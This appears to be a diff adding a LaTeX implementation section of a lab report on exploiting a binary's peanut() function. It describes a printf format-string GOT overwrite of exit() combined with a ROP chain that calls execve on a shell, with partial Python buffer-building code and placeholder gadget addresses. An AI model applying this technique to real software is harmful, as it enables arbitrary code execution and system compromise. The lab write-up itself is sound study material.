@@ -1,0 +1,80 @@
+\section{Implementation}\label{sec:implementation}
+The buffer we used to execute {\tt execve("/bin/shh")} has the following contruction:
+
+{\tt \small
+\begin{verbatim}
++---------+  ^
+| %x & %n |  |  stack
+| three   |  |  grows
+| times   |  |  this way
++---------+  +
+|   ROP   |
+|  chain  |
++---------+
+| padding |
+| optional|
++---------+
+|  exit   |
+|addresses|
++---------+
+\end{verbatim}
+}
+
+We explain step by step how to construct the exploit in this section.
+
+\subsection{printf specifiers}
+When executing the \%n specifiers which point to the exit addresses, the printf() function will overwrite the entry in the GOT table. We needed to write the address {\tt 0x7ffff7b49c0e} at the address {\tt 0x601030} (see subsection on exit address). We write this adress in three times, in the following order:
+\begin{enumerate}
+\item {\tt 0x7fff} at {\tt 0x601034}
+\item {\tt 0x9c0e} at {\tt 0x601030}
+\item {\tt 0xf7b4} at {\tt 0x601032}
+\end{enumerate}
+Since \%n write the number of printed characters since the beginning of the execution of printf(), we need to write the address in the increasing order of their values. Because the position of the addresses of exit on the stack where from the 67th to the 69th and we only want to write 2 bytes, then the exploit must start with:
+
+{\tt \small
+\begin{verbatim}
+exploit = ""
+exploit += " %{}x ".format(0x7fff)
+exploit += " %67$hn "
+exploit += " %{}x ".format(0x9c0e - 0x7fff)
+exploit += " %68$hn "
+exploit += " %{}x ".format(0xf7b4 - 0x9c0e)
+exploit += " %69$hn "
+\end{verbatim}
+}
+
+A few change in the numerical values must be performed to take in account that we print spaces with the specifiers.
+
+\subsection{ROP chain}
+By writing the {\tt execve("/bin/shh")} code in C and looking at the assembly, we list the content of the registers we need to set up.
+\begin{enumerate}
+\item rax: execve code, 0x3b.
+\item rdi: address of "/bin/shh" string, needs to be followed by a null byte.
+\item rsi and rdx: 0x0.
+\end{enumerate}
+The implementation of the ROP chain in the exploit buffer is as followed:
+{\tt \small
+\begin{verbatim}
+exploit += <pop rax address>
+exploit += 0x000000000000003b
+exploit += <pop rdi address>
+exploit += <address of "/bin/shh">
+exploit += <pop rsi address>
+exploit += 0x0000000000000000
+exploit += <pop rdx address>
+exploit += 0x0000000000000000
+\end{verbatim}
+}
+We used the struct package and its pack() function in our exploit to implement this ROP chain.
+
+\subsection{Padding}
+Padding to cover the whole buffer is optional but useful when creating the exploit. If we need to add something before the exit addresses, their position will change and we will need to start again, determining their position to point at it again. With a padding, the position of the exit addresses will stay the same whatever we append to the exploit buffer before padding. We implemented the padding as follow:
+\begin{verbatim}
+def pad(s):
+	return s+X*(buffer_size - len(s) - exit_addresses_size)
+exploit = pad(exploit)
+\end{verbatim}
+}
+
+\subsection{Exit addresses}
+The exit address in the GOT can be determined simply by disassembling peanut(). We see that the function called is {\tt <exit@plt>}, which jumps directly to another address, which is the place in the GOT which store the real address of exit(). In our case, this address is {\tt 0x601030}.
